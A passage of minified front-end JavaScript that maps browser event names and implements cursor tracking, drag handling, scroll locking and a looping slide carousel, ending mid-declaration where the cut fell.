Map([[k.ABORT,!0],[k.AFTERPRINT,!0],[k.ANIMATIONEND,!0],[k.ANIMATIONITERATION,!0],[k.ANIMATIONSTART,!0],[k.APPINSTALLED,!0],[k.AUDIOPROCESS,!0],[k.AUDIOEND,!0],[k.AUDIOSTART,!0],[k.BEFOREPRINT,!0],[k.BEFOREUNLOAD,!0],[k.BEGIN_EVENT,!0],[k.BLOCKED,!0],[k.BLUR,!0],[k.BOUNDARY,!0],[k.CACHED,!0],[k.CANPLAY,!0],[k.CANPLAYTHROUGH,!0],[k.CHANGE,!0],[k.CHARGINGCHANGE,!0],[k.CHARGINGTIMECHANGE,!0],[k.CHECKING,!0],[k.CLICK,!0],[k.CLOSE,!0],[k.COMPLETE,!0],[k.THE,!0],[k.COMPOSITIONEND,!0],[k.COMPOSITIONSTART,!0],[k.COMPOSITIONUPDATE,!0],[k.CONTEXTMENU,!0],[k.COPY,!0],[k.CUT,!0],[k.DBLCLICK,!0],[k.DEVICECHANGE,!0],[k.DEVICELIGHT,!0],[k.DEVICEMOTION,!0],[k.DEVICEORIENTATION,!0],[k.DEVICEPROXIMITY,!0],[k.DISCHARGINGTIMECHANGE,!0],[k.DOMACTIVATE,!0],[k.DOMATTRIBUTE_NAME_CHANGED,!0],[k.DOMATTR_MODIFIED,!0],[k.DOMCHARACTER_DATA_MODIFIED,!0],[k.DOMCONTENT_LOADED,!0],[k.DOMELEMENT_NAME_CHANGED,!0],[k.DOMFOCUS_IN,!0],[k.DOMFOCUS_OUT,!0],[k.DOMNODE_INSERTED,!0],[k.DOMNODE_INSERTED_INTO_DOCUMENT,!0],[k.DOMNODE_REMOVED,!0],[k.DOMNODE_REMOVED_FROM_DOCUMENT,!0],[k.DOMSUBTREE_MODIFIED,!0],[k.DOWNLOADING,!0],[k.DRAG,!0],[k.DRAGEND,!0],[k.DRAGENTER,!0],[k.DRAGLEAVE,!0],[k.DRAGOVER,!0],[k.DRAGSTART,!0],[k.DROP,!0],[k.DURATIONCHANGE,!0],[k.EMPTIED,!0],[k.END,!0],[k.ENDED,!0],[k.END_EVENT,!0],[k.ERROR,!0],[k.FOCUS,!0],[k.FOCUSIN,!0],[k.FOCUSOUT,!0],[k.FULLSCREENCHANGE,!0],[k.FULLSCREENERROR,!0],[k.GAMEPADCONNECTED,!0],[k.GAMEPADDISCONNECTED,!0],[k.GOTPOINTERCAPTURE,!0],[k.HASHCHANGE,!0],[k.LOSTPOINTERCAPTURE,!0],[k.INPUT,!0],[k.INVALID,!0],[k.KEYDOWN,!0],[k.KEYPRESS,!0],[k.KEYUP,!0],[k.LANGUAGECHANGE,!0],[k.LEVELCHANGE,!0],[k.LOAD,!0],[k.LOADEDDATA,!0],[k.LOADEDMETADATA,!0],[k.LOADEND,!0],[k.LOADSTART,!0],[k.MARK,!0],[k.MESSAGE,!0],[k.MESSAGEERROR,!0],[k.MOUSEDOWN,!0],[k.MOUSEENTER,!0],[k.MOUSELEAVE,!0],[k.MOUSEMOVE,!0],[k.MOUSEOUT,!0],[k.MOUSEOVER,!0],[k.MOUSEUP,!0],[k.NOMATCH,!0],[k.NOTIFICATIONCLICK,!0],[k.NOUPDATE,!0],[k.OBSOLETE,!0],[k.OFFLINE,!0],[k.ONLINE,!0],[k.OPEN,!0],[k.ORIENTATIONCHANGE,!0],[k.PAGEHIDE,!0],[k.PAGESHOW,!0],[k.PASTE,!0],[k.PAUSE,!0],[k.POINTERCANCEL,!0],[k.POINTERDOWN,!0],[k.POINTERENTER,!0],[k.POINTERLEAVE,!0],[k.POINTERLOCKCHANGE,!0],[k.POINTERLOCKERROR,!0],[k.POINTERMOVE,!0],[k.POINTEROUT,!0],[k.POINTEROVER,!0],[k.POINTERUP,!0],[k.PLAY,!0],[k.PLAYING,!0],[k.POPSTATE,!0],[k.PROGRESS,!0],[k.PUSH,!0],[k.PUSHSUBSCRIPTIONCHANGE,!0],[k.RATECHANGE,!0],[k.READYSTATECHANGE,!0],[k.REPEAT_EVENT,!0],[k.RESET,!0],[k.RESIZE,!0],[k.RESOURCETIMINGBUFFERFULL,!0],[k.RESULT,!0],[k.RESUME,!0],[k.SCROLL,!0],[k.SEEKED,!0],[k.SEEKING,!0],[k.SELECT,!0],[k.SELECTSTART,!0],[k.SELECTIONCHANGE,!0],[k.SHOW,!0],[k.SOUNDEND,!0],[k.SOUNDSTART,!0],[k.SPEECHEND,!0],[k.SPEECHSTART,!0],[k.STALLED,!0],[k.START,!0],[k.STORAGE,!0],[k.SUBMIT,!0],[k.SUCCESS,!0],[k.SUSPEND,!0],[k.SVGABORT,!0],[k.SVGERROR,!0],[k.SVGLOAD,!0],[k.SVGRESIZE,!0],[k.SVGSCROLL,!0],[k.SVGUNLOAD,!0],[k.SVGZOOM,!0],[k.TIMEOUT,!0],[k.TIMEUPDATE,!0],[k.TOUCHCANCEL,!0],[k.TOUCHEND,!0],[k.TOUCHMOVE,!0],[k.TOUCHSTART,!0],[k.TRANSITIONEND,!0],[k.UNLOAD,!0],[k.UPDATEREADY,!0],[k.UPGRADENEEDED,!0],[k.USERPROXIMITY,!0],[k.VOICESCHANGED,!0],[k.VERSIONCHANGE,!0],[k.VISIBILITYCHANGE,!0],[k.VOLUMECHANGE,!0],[k.WAITING,!0],[k.WHEEL,!0],[k.AFTERSCRIPTEXECUTE,!0],[k.BEFORESCRIPTEXECUTE,!0],[k.BEFOREINSTALLPROMPT,!0],[k.CARDSTATECHANGE,!0],[k.CONNECTION_INFO_UPDATE,!0],[k.CFSTATECHANGE,!0],[k.DATACHANGE,!0],[k.DATAERROR,!0],[k.DOMMOUSE_SCROLL,!0],[k.DRAGDROP,!0],[k.DRAGEXIT,!0],[k.DRAGGESTURE,!0],[k.ICCCARDLOCKERROR,!0],[k.ICCINFOCHANGE,!0],[k.LOCALIZED,!0],[k.MOUSEWHEEL,!0],[k.MOZ_AUDIO_AVAILABLE,!0],[k.MOZ_BEFORE_RESIZE,!0],[k.MOZBROWSERACTIVITYDONE,!0],[k.MOZBROWSERASYNCSCROLL,!0],[k.MOZBROWSERAUDIOPLAYBACKCHANGE,!0],[k.MOZBROWSERCARETSTATECHANGED,!0],[k.MOZBROWSERCLOSE,!0],[k.MOZBROWSERCONTEXTMENU,!0],[k.MOZBROWSERDOCUMENTFIRSTPAINT,!0],[k.MOZBROWSERERROR,!0],[k.MOZBROWSERFINDCHANGE,!0],[k.MOZBROWSERFIRSTPAINT,!0],[k.MOZBROWSERICONCHANGE,!0],[k.MOZBROWSERLOCATIONCHANGE,!0],[k.MOZBROWSERLOADEND,!0],[k.MOZBROWSERLOADSTART,!0],[k.MOZBROWSERMANIFESTCHANGE,!0],[k.MOZBROWSERMETACHANGE,!0],[k.MOZBROWSEROPENSEARCH,!0],[k.MOZBROWSEROPENTAB,!0],[k.MOZBROWSEROPENWINDOW,!0],[k.MOZBROWSERRESIZE,!0],[k.MOZBROWSERSCROLL,!0],[k.MOZBROWSERSCROLLAREACHANGED,!0],[k.MOZBROWSERSCROLLVIEWCHANGE,!0],[k.MOZBROWSERSECURITYCHANGE,!0],[k.MOZBROWSERSELECTIONSTATECHANGED,!0],[k.MOZBROWSERSHOWMODALPROMPT,!0],[k.MOZBROWSERTITLECHANGE,!0],[k.MOZBROWSERUSERNAMEANDPASSWORDREQUIRED,!0],[k.MOZBROWSERVISIBILITYCHANGE,!0],[k.MOZ_GAMEPAD_BUTTON_DOWN,!0],[k.MOZ_GAMEPAD_BUTTON_UP,!0],[k.MOZ_MOUSE_PIXEL_SCROLL,!0],[k.MOZ_ORIENTATION,!0],[k.MOZ_SCROLLED_AREA_CHANGED,!0],[k.MOZTIMECHANGE,!0],[k.MOZ_TOUCH_DOWN,!0],[k.MOZ_TOUCH_MOVE,!0],[k.MOZ_TOUCH_UP,!0],[k.ALERTING,!0],[k.BUSY,!0],[k.CALLSCHANGED,!0],[k.ONCONNECTED,!0],[k.CONNECTING,!0],[k.DELIVERED,!0],[k.DIALING,!0],[k.DISABLED,!0],[k.DISCONNECTED,!0],[k.DISCONNECTING,!0],[k.ENABLED,!0],[k.HELD,!0],[k.HOLDING,!0],[k.INCOMING,!0],[k.RECEIVED,!0],[k.RESUMING,!0],[k.SENT,!0],[k.STATECHANGE,!0],[k.STATUSCHANGE,!0],[k.OVERFLOW,!0],[k.SMARTCARD,!0],[k.STKCOMMAND,!0],[k.STKSESSIONEND,!0],[k.TEXT,!0],[k.TOUCHENTER,!0],[k.TOUCHLEAVE,!0],[k.UNDERFLOW,!0],[k.UPLOADPROGRESS,!0],[k.USSDRECEIVED,!0],[k.VOICECHANGE,!0],[k.BROADCAST,!0],[k.CHECKBOX_STATE_CHANGE,!0],[k.COMMAND,!0],[k.COMMANDUPDATE,!0],[k.DOMMENU_ITEM_ACTIVE,!0],[k.DOMMENU_ITEM_INACTIVE,!0],[k.POPUPHIDDEN,!0],[k.POPUPHIDING,!0],[k.POPUPSHOWING,!0],[k.POPUPSHOWN,!0],[k.RADIO_STATE_CHANGE,!0],[k.VALUE_CHANGE,!0],[k.ADD,!0],[k.MOZ_SWIPE_GESTURE,!0],[k.MOZ_MAGNIFY_GESTURE_START,!0],[k.MOZ_MAGNIFY_GESTURE_UPDATE,!0],[k.MOZ_MAGNIFY_GESTURE,!0],[k.MOZ_ROTATE_GESTURE_START,!0],[k.MOZ_ROTATE_GESTURE_UPDATE,!0],[k.MOZ_ROTATE_GESTURE,!0],[k.MOZ_TAP_GESTURE,!0],[k.MOZ_PRESS_TAP_GESTURE,!0],[k.MOZ_EDGE_UIGESTURE,!0],[k.MOZ_AFTER_PAINT,!0],[k.DOMPOPUP_BLOCKED,!0],[k.DOMWINDOW_CREATED,!0],[k.DOMWINDOW_CLOSE,!0],[k.DOMTITLE_CHANGED,!0],[k.DOMLINK_ADDED,!0],[k.DOMLINK_REMOVED,!0],[k.DOMMETA_ADDED,!0],[k.DOMMETA_REMOVED,!0],[k.DOMWILL_OPEN_MODAL_DIALOG,!0],[k.DOMMODAL_DIALOG_CLOSED,!0],[k.DOMAUTO_COMPLETE,!0],[k.DOMFRAME_CONTENT_LOADED,!0],[k.ALERT_ACTIVE,!0],[k.ALERT_CLOSE,!0],[k.FULLSCREEN,!0],[k.SIZEMODECHANGE,!0],[k.MOZ_ENTERED_DOM_FULLSCREEN,!0],[k.SSWINDOW_CLOSING,!0],[k.SSTAB_CLOSING,!0],[k.SSTAB_RESTORING,!0],[k.SSTAB_RESTORED,!0],[k.SSWINDOW_STATE_READY,!0],[k.SSWINDOW_STATE_BUSY,!0],[k.TAB_OPEN,!0],[k.TAB_CLOSE,!0],[k.TAB_SELECT,!0],[k.TAB_SHOW,!0],[k.TAB_HIDE,!0],[k.TAB_PINNED,!0],[k.TAB_UNPINNED,!0],[k.CSS_RULE_VIEW_REFRESHED,!0],[k.CSS_RULE_VIEW_CHANGED,!0],[k.CSS_RULE_VIEW_CSSLINK_CLICKED,!0]]);function eC(t){return t.toString().split("Symbol(").slice(1).join("Symbol(").split(")").slice(0,-1).join(")")}var UF=0,Ou=Xe.usingFunction((function(t){var e=eC(t);return JA.has(t)?e:"CustomEvent_"+UF++}));function Kn(t,e,i){if($o.has(e))return $o.get(e).forEach((function(e){return Kn(t,e,i)}));var r=Ou.get(e);t.addEventListener(r,i)}function Za(t,e,i){if($o.has(e))return $o.get(e).forEach((function(e){return Za(t,e,i)}));var r=Ou.get(e);t.removeEventListener(r,i)}var Zn=new Je(0,0),HF=function(){function t(){this.currentFrame=0,this.render()}return t.prototype.render=function(){var t=this;de.framecount((function(){t.currentFrame++,de.cleanup((function(){return t.render()}))}))},t.prototype.getFrame=function(){return this.currentFrame},t.getSingleton=function(){return this.singleton||(this.singleton=new this)},t.singleton=null,t}(),Ru=HF.getSingleton();function xs(t,e){for(var i=0;i<t.length&&e(t[i],i);)i++;return t.slice(0,i)}function tC(t,e){return xs(t,(function(t,i){return!e(t,i)}))}var GF=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r};function rC(t,e){var i=tC(t,e);return i.length<t.length?GF(i,[t[i.length]]):i}var Ja=function(){function t(t,e){this.position_=t,this.pressed_=e,this.frame_=Ru.getFrame(),this.time_=new Date}return t.fromXY=function(t,e,i){return new this(new Je(t,e),i)},t.prototype.getFrame=function(){return this.frame_},t.prototype.isForFrame=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return-1!==t.indexOf(this.getFrame())},t.prototype.isPressed=function(){return this.pressed_},t.prototype.getPosition=function(){return this.position_},t.prototype.getTime=function(){return this.time_},t}(),iC=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},zF=1e3,jF=100,YF=new Ja(Zn,!1),Mu=function(){function t(t){void 0===t&&(t=YF);for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];this.positions_=iC([t],e)}return t.prototype.update=function(e){return new(t.bind.apply(t,iC([void 0,e],this.positions_.slice(0,jF-1))))},t.prototype.getLatestPosition=function(){return this.positions_[0]},t.prototype.getPosition=function(){return this.getLatestPosition().getPosition()},t.prototype.getFrameDelta=function(){return this.getFrameDelta_(!1)},t.prototype.getPressedFrameDelta=function(){return this.getFrameDelta_(!0)},t.prototype.getFrameDelta_=function(t){var e=this.getPositionsForFrameDelta_(t);return 0===e.length?Zn:Je.sumDeltas.apply(Je,e.map((function(t){return t.getPosition()})))},t.prototype.getPositionsForFrameDelta_=function(t){var e=Ru.getFrame();if(!this.getLatestPosition().isForFrame(e))return[];var i=rC(this.positions_,(function(t){return!t.isForFrame(e)}));if(t){return xs(i,(function(t){return t.isPressed()}))}return i},t.prototype.getGestureDelta=function(){return t.getGestureDeltaFromPositions_.apply(t,this.positions_)},t.prototype.getPressedGestureDelta=function(){return t.getGestureDeltaFromPositions_.apply(t,this.getPressedGesturePositions_())},t.prototype.getLastFrameVelocity=function(){var t=this.getFramesWithTimeDifference_(),e=t[0],i=t.slice(-1)[0],r=(e.getTime().valueOf()-i.getTime().valueOf())/1e3;return this.getLastFrameDelta().scale(1/r)},t.prototype.getLastFrameDelta=function(){var t=this.getFramesWithTimeDifference_(),e=t[0],i=t.slice(-1)[0];return e.getPosition().subtract(i.getPosition())},t.prototype.getFramesWithTimeDifference_=function(){var t=this.positions_[0],e=this.positions_.find((function(e){return e.getTime().valueOf()!==t.getTime().valueOf()}));return this.positions_.slice(0,this.positions_.indexOf(e)+1)},t.prototype.getPressedGesturePositions_=function(){var t=(new Date).valueOf();return xs(this.positions_,(function(e){return t-e.getTime().valueOf()<zF&&e.isPressed()}))},t.getGestureDeltaFromPositions_=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=Je.getDeltas.apply(Je,t.map((function(t){return t.getPosition()}))),r=i.map((function(t,e){return t.scale((i.length-e)/i.length)}));return Je.add.apply(Je,r)},t}(),Hp=new Set,el=null,$u=function(){function t(){var t=this;this.clientPosition_=new Mu,this.pagePosition_=new Mu,this.screenPosition_=new Mu,this.pressed_=!1,this.frame_=0,this.cursorDownHandler_=function(e){return t.updatePress_(e,!0)},this.cursorUpHandler_=function(e){return t.updatePress_(e,!1)},this.cursorMoveHandler_=function(e){return t.updatePosition_(e)},this.init_()}return t.prototype.init_=function(){Kn(window,k.CURSOR_DOWN,this.cursorDownHandler_),Kn(window,k.CURSOR_UP,this.cursorUpHandler_),Kn(window,k.CURSOR_MOVE,this.cursorMoveHandler_)},t.getSingleton=function(e){return Hp.add(e),null===el&&(el=new t),el},t.prototype.isPressed=function(){return this.pressed_},t.prototype.getClient=function(){return this.clientPosition_},t.prototype.getPage=function(){return this.pagePosition_},t.prototype.getScreen=function(){return this.screenPosition_},t.prototype.updatePress_=function(t,e){this.pressed_=e,this.updatePosition_(t)},t.prototype.updatePosition_=function(t){t instanceof MouseEvent?this.updatePositionFromEvent_(t):t instanceof TouchEvent&&this.updatePositionFromTouchEvent_(t)},t.prototype.updatePositionFromTouchEvent_=function(t){t.touches.length>0?this.updatePositionFromEvent_(t.touches[0]):this.endTouch_()},t.prototype.endTouch_=function(){var t=this;de.premeasure((function(){t.pagePosition_=t.duplicatePosition_(t.pagePosition_),t.clientPosition_=t.duplicatePosition_(t.clientPosition_),t.screenPosition_=t.duplicatePosition_(t.screenPosition_)}))},t.prototype.updatePositionFromEvent_=function(t){var e=this;de.premeasure((function(){e.pagePosition_=e.updatePositionWithXY_(e.pagePosition_,t.pageX,t.pageY),e.clientPosition_=e.updatePositionWithXY_(e.clientPosition_,t.clientX,t.clientY),e.screenPosition_=e.updatePositionWithXY_(e.screenPosition_,t.screenX,t.screenY)}))},t.prototype.duplicatePosition_=function(t){return t.update(new Ja(t.getPosition(),this.isPressed()))},t.prototype.updatePositionWithXY_=function(t,e,i){return t.update(Ja.fromXY(e,i,this.isPressed()))},t.prototype.destroy=function(t){this===el?(Hp.delete(t),Hp.size<=0&&(el=null,this.destroy_())):this.destroy_()},t.prototype.destroy_=function(){Za(window,k.CURSOR_DOWN,this.cursorDownHandler_),Za(window,k.CURSOR_UP,this.cursorUpHandler_),Za(window,k.CURSOR_MOVE,this.cursorMoveHandler_)},t}(),XF=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},Lu=function(){function t(t,e){var i=(void 0===e?{}:e).constraints,r=void 0===i?[]:i;this.element_=t,this.interacting_=!1,this.constraints_=XF(r),this.cursor_=$u.getSingleton(this),this.init_()}return t.prototype.init_=function(){this.initInteraction_(),this.render_()},t.prototype.initInteraction_=function(){var t=this;Kn(this.element_,k.CURSOR_DOWN,(function(){return t.startInteraction_()}));var e=[k.CONTEXTMENU,k.DRAGSTART,k.CURSOR_UP],i=function(){return t.endInteraction_()};e.forEach((function(t){return Kn(window,t,i)}))},t.prototype.startInteraction_=function(){this.interacting_=!0,Tn.dispatchEvent(new Su(this))},t.prototype.endInteraction_=function(){var t=this;!this.interacting_||(this.interacting_=!1,de.measure((function(){Tn.dispatchEvent(new Eu(t,t.getDelta_(),t.cursor_.getClient().getLastFrameVelocity()))})))},t.prototype.isInteracting_=function(){return this.interacting_},t.prototype.render_=function(){var t=this;de.measure((function(){t.renderDrag_(),de.cleanup((function(){return t.render_()}))}))},t.prototype.renderDrag_=function(){if(this.isInteracting_()){var t=this.getDelta_();!t.getLength()||(Tu.getSingleton().renderDrag(this,t),Tn.dispatchEvent(new wu(this,this.element_,t)))}},t.prototype.getDelta_=function(){var t=this;return this.constraints_.reduce((function(e,i){return i.constrain(t,e)}),this.cursor_.getClient().getPressedFrameDelta())},t.prototype.getElement=function(){return this.element_},t.prototype.destroy=function(){this.cursor_.destroy(this)},t}(),Gp=function(){function t(){this.counter_=0}return t.getSingleton=function(){return this.singleton=this.singleton||new this},t.prototype.lockScroll=function(){if(Mr.getBrowser()!==Un){if(0===this.counter_){var t=er.offsetWidth;Ie(er,"overflow","hidden"),Ie(er,"width",t+"px")}this.counter_++}},t.prototype.unlockScroll=function(){Mr.getBrowser()!==Un&&(1===this.counter_?(Ie(er,"overflow",""),Ie(er,"width","")):this.counter_<1&&ct.throw("You have tried to unlock the scroll more times than you have locked the scroll."),this.counter_--)},t}(),QF=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),KF=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r};function nC(t){return 1.05*Math.abs(t.getX())>Math.abs(t.getY())}var sC=function(t){function e(e,i){var r=(void 0===i?{}:i).constraints,n=this,s=KF(void 0===r?[]:r,[new Iu]);return(n=t.call(this,e,{constraints:s})||this).dragDelta_=Zn,n.potentialInteractionStarted_=!1,n}return QF(e,t),e.prototype.startInteraction_=function(){this.potentialInteractionStarted_=!0},e.prototype.renderDrag_=function(){if(this.potentialInteractionStarted_){var e=this.cursor_.getClient().getPressedFrameDelta();if(0!==e.getLength()){if(this.isInteracting_()){if(this.dragDelta_=this.dragDelta_.add(e),!nC(this.dragDelta_))return void this.endInteraction_()}else nC(e)?(Gp.getSingleton().lockScroll(),this.dragDelta_=e,t.prototype.startInteraction_.call(this)):this.potentialInteractionStarted_=!1;t.prototype.renderDrag_.call(this)}}},e.prototype.endInteraction_=function(){!this.interacting_||(this.dragDelta_=Zn,this.potentialInteractionStarted_=!1,t.prototype.endInteraction_.call(this),Gp.getSingleton().unlockScroll())},e}(Lu),ZF=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),JF=new Iu,oC=function(t){function e(e,i){void 0===i&&(i=!1);var r=[];i||r.push(JF),e.allowsLooping()||r.push(new ZA(e));var n={constraints:r},s=i?function(t){return new sC(t,n)}:function(t){return new Lu(t,n)};return t.call(this,[],Map,s)||this}return ZF(e,t),e}(Xe),aC=function(){function t(t,e,i){this.translationRange_=i,this.target_=t,this.timeRange_=e}return t.prototype.getTarget=function(){return this.target_},t.prototype.getEndTime=function(){return this.timeRange_.getMax()},t.prototype.getTranslationRange=function(){return this.translationRange_},t.prototype.getTimeRange=function(){return this.timeRange_},t.prototype.getTargetTime=function(){return console.warn("TransitionTarget.getTargetTime() is deprecated."),this.getEndTime()},t}();function zp(t,e){return-ln(t,e.getContainer())}function lC(t,e,i,r){for(var n=[],s=t.length,o=wn(r),a=Xr(i,s),l=Xr(e,s);l!==a;)n.push(t[l]),l=Xr(l+o,s);return n}function jp(t,e,i,r,n){var s=eN(t,e,i,n)-r.get(i);0!==s&&xn(i,new Je(s,0))}function eN(t,e,i,r){if(e===i)return 0;var n=Pu(tN(t,e,i,r));return(i.offsetWidth/2+n+e.offsetWidth/2)*r}function tN(t,e,i,r){var n=t.getSlideIndex(e),s=t.getSlideIndex(i)-r;return t.allowsLooping()?lC(t.getSlides(),s,n,-r):n===s?[]:t.getSlides().slice(Math.min(n+1,s),Math.max(n,s+r))}var rN=Mo.getSingleton();function cC(t,e){if(t.allowsLooping()){var i=t.getSlides().reduce((function(t,e){return t+e.offsetWidth}),0),r=ln(e)+rN.getAlteredXTranslation(e),n=wn(r);if(Math.abs(r)>i/2){var s=-i*n,o=gi.clientWidth*n+r+s;Math.abs(o)<Math.abs(r)&&xn(e,new Je(s,0))}}}function uC(t,e){return void 0===e&&(e=null),_u(t,e)>0}var hC=Symbol("Physical Slide Interaction"),Yp=function(){function t(t){var e=this,i=void 0===t?{}:t,r=i.transitionTime,n=void 0===r?500:r,s=i.easingFunction,o=void 0===s?QA.EASES_IN_OUT_SINE:s,a=i.lockScroll,l=void 0!==a&&a;this.matrixService_=Mo.getSingleton(),this.carousels_=new Set,this.carouselListeners_=Xe.usingFunction((function(){return new Set})),this.draggableBySlide_=Xe.usingFunction((function(t){return new oC(t,l)})),this.easingFunction_=o,this.interactionStartPosition_=Xe.usingFunction((function(){return null})),this.interactionStartTime_=Xe.usingFunction((function(){return null})),this.transitionTime_=n,this.transitionTargets_=new Map,this.resizeTimeout_=null,this.resizeHandler_=function(){window.clearTimeout(e.resizeTimeout_),e.resizeTimeout_=window.setTimeout((function(){Vr(e.carousels_.values(),(function(t){e.transition(t.getActiveSlide(),t,0)}))}))},window.addEventListener("resize",this.resizeHandler_)}return t.prototype.init=function(t,e){var i=this;this.carousels_.add(e),e.onDestroy((function(t){return i.destroy_(t)})),this.initActiveSlide_(t,e),this.initDraggableSlides_(e)},t.prototype.validateCarousel_=function(t){this.carousels_.has(t)||ct.throw("PhysicalSlide instance not initialized for this carousel.")},t.prototype.initActiveSlide_=function(t,e){var i=this;de.measure((function(){return i.transition(t,e,0)}))},t.prototype.initDraggableSlides_=function(t){var e,i=this,r=t.getSlides().map((function(e){var r=i.draggableBySlide_.get(t).get(e),n=Tn.addListener(r,Su,(function(e){return i.startInteraction_(e,t)})),s=Tn.addListener(r,wu,(function(e){return i.adjustSplit_(t,e.getElement())})),o=Tn.addListener(r,Eu,(function(e){return i.endInteraction_(e,t)}));return i.carouselListeners_.get(t).add(n),i.carouselListeners_.get(t).add(s),i.carouselListeners_.get(t).add(o),r}));(e=Tu.getSingleton()).syncDraggables.apply(e,r)},t.prototype.renderLoop=function(t){var e=this;this.validateCarousel_(t),de.measure((function(){t.isBeingInteractedWith()||(e.transitionTargets_.has(t)?e.transitionToTarget_(t):e.adjustSplit_(t)),t.getSlides().forEach((function(e){uC(e,t.getContainer())?Ie(e,"visibility",""):Ie(e,"visibility","hidden")}))}))},t.prototype.transitionToTarget_=function(t){var e=this.transitionTargets_.get(t),i=e.getTimeRange().getValueAsPercent(performance.now()),r=this.easingFunction_(i),n=e.getTranslationRange().getPercentAsValue(r)-Je.fromElementTransform(e.getTarget()).x;t.getSlides().forEach((function(t){return xn(t,new Je(n,0))})),this.adjustSplit_(t,e.getTarget()),1===i&&this.transitionTargets_.delete(t)},t.prototype.adjustSplit_=function(t,e){void 0===e&&(e=null),null!==e&&cC(t,e);for(var i=e||t.getActiveSlide(),r=this.getDistancesFromTarget_(t,i),n=Po(i),s=n+i.offsetWidth,o=t.getSlides(),a=o.filter((function(t){return t!==i})),l=t.getSlideIndex(i),h=new Set(a),c=o.length,u=t.allowsLooping()?Math.max(n,0):Hr.apply(void 0,o.slice(0,l).map((function(t){return t.offsetWidth}))),d=er.clientWidth,p=l,m=t.allowsLooping()?Math.min(d,d-s):Hr.apply(void 0,o.slice(l+1).map((function(t){return t.offsetWidth}))),f=l;h.size>0;)if(u>m){if((p=Xr(p-1,c))===l)continue;var g=o[p];if(!h.has(g))continue;jp(t,i,g,r,-1),u-=g.offsetWidth,h.delete(g)}else{if((f=Xr(f+1,c))===l)continue;g=o[f];if(!h.has(g))continue;jp(t,i,g,r,1),m-=g.offsetWidth,h.delete(g)}},t.prototype.getDistancesFromTarget_=function(t,e){var i=this,r=new Map;return t.getSlides().forEach((function(t){var n=ln(t,e)+i.matrixService_.getAlteredXTranslation(t)-i.matrixService_.getAlteredXTranslation(e);r.set(t,n)})),r},t.prototype.startInteraction_=function(t,e){null===this.interactionStartPosition_.get(e)&&(this.transitionTargets_.delete(e),this.interactionStartTime_.set(e,performance.now()),this.interactionStartPosition_.set(e,Je.fromElementTransform(t.getTarget().getElement())),e.startInteraction(hC))},t.prototype.endInteraction_=function(t,e){if(null!==this.interactionStartPosition_.get(e)){e.endInteraction(hC);var i=performance.now()-this.interactionStartTime_.get(e),r=this.getActiveSlide(e),n=zp(r,e),s=Je.fromElementTransform(t.getTarget().getElement()).subtract(this.interactionStartPosition_.get(e)),o=Math.abs(s.getX())>Math.abs(s.getY()),a=i>700&&o?0:s.getX();this.interactionStartTime_.set(e,null),this.interactionStartPosition_.set(e,null);var l=wn(a),h=wn(n),c=e.allowsLooping();0===n||h===l||0===a?e.transitionToSlide(r):1===l?c||r!==e.getFirstSlide()?e.previous():e.transitionToSlide(r):c||r!==e.getLastSlide()?e.next():e.transitionToSlide(r)}},t.prototype.transition=function(t,e,i){if(void 0===i&&(i=null),this.validateCarousel_(e),!this.transitionTargets_.has(e)||this.transitionTargets_.get(e).getTarget()!==t){var r=null===i?this.transitionTime_:i,n=performance.now(),s=new Ae(n,n+r),o=Je.fromElementTransform(t).getX(),a=zp(t,e)+o,l=new Ae(o,a),h=new aC(t,s,l);this.transitionTargets_.set(e,h)}},t.prototype.getActiveSlide=function(t){this.validateCarousel_(t);var e=t.getLastActiveSlide();return Cn(t.getSlides(),(function(e){return Math.abs(ln(e,t.getContainer()))}),(function(t){return t===e?0:1}))},t.prototype.hasTransitionedTo=function(t,e){return this.validateCarousel_(e),0===ln(t,e.getContainer())},t.prototype.destroy_=function(t){window.removeEventListener("resize",this.resizeHandler_),window.clearTimeout(this.resizeTimeout_),Vr(this.carouselListeners_.get(t).values(),(function(t){return Tn.removeListener(t)})),this.carouselListeners_.delete(t),this.carousels_.delete(t),this.transitionTargets_.delete(t)},t}(),cn={TITLES_CONTAINER:te.mqnCssName("mqn2-newman-stream__carousel__titles"),TITLE:te.mqnCssName("mqn2-newman-stream__carousel__title"),TITLE_CENTER:te.mqnCssName("mqn2-newman-stream__carousel__title--center"),TITLE_LEFT:te.mqnCssName("mqn2-newman-stream__carousel__title--left"),TITLE_RIGHT:te.mqnCssName("mqn2-newman-stream__carousel__title--right"),SLIDES_CONTAINER:te.mqnCssName("mqn2-newman-stream__carousel__slides"),SLIDE:te.mqnCssName("mqn2-newman-stream__carousel__slide"),SLIDE_CENTER:te.mqnCssName("mqn2-newman-stream__carousel__slide--center"),SLIDE_LEFT:te.mqnCssName("mqn2-newman-stream__carousel__slide--left"),SLIDE_RIGHT:te.mqnCssName("mqn2-newman-stream__carousel__slide--right")},tl=class{static get 